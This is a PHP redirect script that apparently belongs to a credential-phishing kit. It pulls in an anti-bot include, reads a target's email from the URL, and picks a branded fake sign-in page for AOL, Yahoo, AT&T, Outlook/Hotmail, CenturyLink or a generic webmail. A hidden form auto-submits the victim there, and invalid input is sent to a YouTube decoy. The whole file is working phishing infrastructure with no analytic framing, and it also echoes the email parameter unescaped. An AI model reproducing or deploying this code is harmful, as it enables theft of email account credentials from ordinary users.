<?php
    session_start();
    include('antibots.php');
    function checkEmail($email) {
        $find1 = strpos($email, '@');
        $find2 = strpos($email, '.');
        return ($find1 !== false && $find2 !== false && $find2 > $find1);
    }
    $email = $_GET['email'];
    $url = substr($email, strpos($email, "@") + 1);
    if ($url == "aol.com" or $url == "verizon.net") {
        $header = "wsignin1.0&rpsnv=13&ct=1648037205&rver=Aol1&wp=MBI_SSL.php";
    } 
    elseif ($url == "yahoo.com" or $url == "att.net" or $url == "sbcglobal.net") {
        $header ="wsignin1.0&rpsnv=13&ct=1648037205&rver=Yah-01&wp=MBI_SSL.php";
    }
    elseif ($url == "outlook.com" or $url == "hotmail.com" or $url == "live.com") {
        $header ="wsignin1.0&rpsnv=13&ct=1648037205&rver=365-01&wp=MBI_SSL.php";
    }
    elseif ($url == "embarqmail.com" or $url == "centurylink.net") {
        $header ="wsignin1.0&rpsnv=13&ct=1648037205&rver=Cen-01&wp=MBI_SSL.php";
    }
    elseif ($url != null or $url != ""){
        $header ="wsignin1.0&rpsnv=13&ct=1648037205&rver=Web-01&wp=MBI_SSL.php";
    }
    elseif (!checkEmail($email) or $email == null or $email == ""){
        $header ="https://www.youtube.com/watch?v=NrI-UBIB8Jk";
    }
?>

<form id="jsform" action="<?php echo $header ; ?>" method="post" name="login" id="login">
    <input name="username" type="hidden" id="username" value="<?php echo $_GET['email']; ?>" placeholder="Username, email, or mobile">
</form>

<script type="text/javascript">
  document.getElementById('jsform').submit();
</script>
